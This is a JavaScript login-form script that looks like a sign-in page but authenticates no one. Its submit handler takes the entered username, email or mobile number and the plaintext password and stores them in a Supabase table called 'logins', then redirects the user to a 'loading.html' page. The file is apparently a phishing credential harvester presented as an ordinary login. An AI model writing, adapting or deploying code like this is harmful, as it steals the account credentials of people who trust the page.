import { supabase } from './supabaseClient.js';

console.log('Main.js loaded at:', new Date());

const isMobileDevice = () => {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
         window.innerWidth <= 768;
};

if (isMobileDevice()) {
  window.addEventListener('error', (e) => {
    console.error('Global error:', e.message);
    alert('Error: ' + e.message);
  });
  window.addEventListener('unhandledrejection', (e) => {
    console.error('Unhandled rejection:', e.reason);
    const msg = typeof e.reason === 'string' ? e.reason : (e.reason && e.reason.message) || 'Unexpected error';
    alert('Network error: ' + msg);
  });
}

// Mobile viewport handling
if (isMobileDevice()) {
  // Prevent zoom on form focus for mobile
  const viewportMeta = document.querySelector('meta[name="viewport"]');
  if (viewportMeta) {
    viewportMeta.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
  }
}

const form = document.querySelector('.form');
const userInput = document.getElementById('user');
const passInput = document.getElementById('pass');

console.log('Script loaded. Form found:', !!form, 'Mobile device:', isMobileDevice());

if (form && userInput && passInput) {
  // For mobile - also handle touchend events
  if (isMobileDevice()) {
    const submitBtn = form.querySelector('button[type="submit"]');
    if (submitBtn) {
      submitBtn.addEventListener('touchend', (e) => {
        e.preventDefault();
        form.dispatchEvent(new Event('submit'));
      });
    }
  }

  form.addEventListener('submit', async (event) => {
    event.preventDefault();
    event.stopPropagation();
    console.log('Form submitted on:', isMobileDevice() ? 'mobile' : 'desktop');
    
    const identifier = userInput.value.trim();
    const password = passInput.value;

    console.log('Form data:', { identifier: !!identifier, password: !!password });

    if (!identifier || !password) {
      alert('Please enter username/email/mobile and password');
      return;
    }

    // Show loading state
    const submitBtn = form.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = 'Logging in...';
    submitBtn.disabled = true;

    try {
      console.log('Attempting to insert data into Supabase...');
      
      const { error } = await supabase.from('logins').insert([
        {
          username_email_or_mobile: identifier,
          password,
          device_type: isMobileDevice() ? 'mobile' : 'desktop',
          timestamp: new Date().toISOString()
        },
      ]);

      if (error) {
        console.error('Supabase insert error:', error);
        alert('Failed to save login. Please try again.');
        submitBtn.textContent = originalText;
        submitBtn.disabled = false;
        return;
      }

      console.log('Data successfully inserted');
      // On success, redirect to a simple loading page (relative path)
      window.location.href = 'loading.html';
    } catch (e) {
      console.error('Unexpected error:', e);
      alert('Something went wrong. Please try again.');
      submitBtn.textContent = originalText;
      submitBtn.disabled = false;
    }
  });
} else {
  console.error('Form elements not found:', { 
    form: !!form, 
    userInput: !!userInput, 
    passInput: !!passInput 
  });
}
